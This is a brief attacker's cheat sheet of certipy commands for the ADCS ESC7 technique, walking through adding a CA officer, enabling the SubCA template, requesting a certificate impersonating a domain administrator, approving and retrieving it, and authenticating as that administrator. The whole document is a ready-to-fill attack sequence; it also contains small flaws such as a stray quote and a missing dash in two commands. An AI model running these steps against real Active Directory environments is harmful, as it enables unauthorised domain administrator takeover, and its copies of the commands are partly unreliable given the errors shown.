# ADCS ESC7

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Addd Officer
```
certipy ca -u '<username>' -p '<password>' -ns 'NS_SERVER' -target '<CA_FQDN>' -ca 'CA_HOST' -add-officer '<SAME_USERNAME>'
```

## 3. Enable SubCA
```
certipy ca -u '<username>' -p '<password>' -ns 'NS_SERVER' -target '<CA_FQDN>' -ca 'CA_HOST' -enable-template SubCA'
```

## 4. Submit SubCA Template
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> -dc-ip <DC_IP> -dc-host <DC_HOST> -template SubCA -upn '<ADMIN_USER>@<DOMAIN>' -sid <ADMIN_SID>
```

## Approve Template Request
```
certipy ca -u '<username>' -p '<password>' -ns 'NS_SERVER' -target '<CA_FQDN>' -ca 'CA_HOST' -issue-request 1
```

## 6. Retrieve Request
```
certipy ca -u '<username>' -p '<password>' -ns 'NS_SERVER' -target '<CA_FQDN>' ca 'CA_HOST' -retrieve '1'
```

## 7. Authenticate
```
certipy auth -pfx <ADMIN_USER>.pfx -dc-ip <DC_IP>
```
